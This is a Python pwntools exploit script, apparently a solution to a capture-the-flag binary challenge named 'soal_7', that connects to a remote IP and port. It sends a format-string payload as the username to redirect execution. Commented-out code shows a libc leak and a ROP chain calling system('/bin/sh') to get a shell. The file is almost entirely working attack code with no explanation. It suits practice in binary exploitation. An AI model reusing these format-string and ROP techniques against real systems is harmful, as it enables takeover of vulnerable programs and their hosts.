from pwn import *

HOST = "103.185.44.235"
PORT = 11206
# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(HOST, PORT, *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Find offset to EIP/RIP for buffer overflows
def find_ip(payload):
    # Launch process and send payload
    p = process(exe, level="warn")
    p.sendlineafter(b">", payload)
    # Wait for the process to crash
    p.wait()
    # Print out the address of EIP/RIP at the time of crashing
    # ip_offset = cyclic_find(p.corefile.pc)  # x86
    ip_offset = cyclic_find(p.corefile.read(p.corefile.sp, 4))  # x64
    warn("located EIP/RIP offset at {a}".format(a=ip_offset))
    return ip_offset


# Specify GDB script here (breakpoints etc)
gdbscript = """
init-pwndbg
b *cek
b *0x004013b2
continue
""".format(
    **locals()
)

# Binary filename
exe = "./soal_7"
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.terminal = "tmux splitw -h".split(" ")
context.log_level = "debug"

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Lib-C library, can use pwninit/patchelf to patch binary
# libc = ELF("./libc6_2.31-0ubuntu9.9_amd64.so")
# ld = ELF("./ld-2.27.so")

# Pass in pattern_size, get back EIP/RIP offset
# offset = find_ip(cyclic(500))
# Start program
io = start()
to_write_pass2 = 0x00402008
to_write = 0x404010
a = 0x0040125E
# Send the payload

# 4202504
# p64(to_write + 2)
# 0x0031325249544550
# payload_fstr = b"%64x%11$hn%8136x%12$hnBB" + p64(a)
payload_fstr = b"%90x%10$pBBBBBBB" + p64(a)
io.sendlineafter(
    b"Username : ",
    payload_fstr,
)
# io.sendlineafter(
#     b"Username : ", b"%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p"
# )
io.sendlineafter(b"Password : ", b"passwd123")


# Got Shell?
# print(io.recvuntil(b": "))
# leaked_libc = io.recv(6)
# leaked_libc = u64(leaked_libc.ljust(8, b"\x00"))
# info("Leaked printf @ " + hex(leaked_libc))

# print(libc.sym["printf"])
# libc.address = leaked_libc - libc.sym["printf"]

# binsh = libc.search(b"/bin/sh\x00").__next__()
# system = libc.sym["system"]

# info("bin_sh @ " + hex(binsh))
# info("system @ " + hex(system))

# libc_rop = ROP(libc)
# libc_rop.call("system", [binsh])

# io.sendlineafter(b":", b"a")
# io.sendlineafter(b":", cyclic(48 + 8) + p64(ret) + libc_rop.chain())
# io.sendlineafter(b":", b"111122223333")


io.interactive()
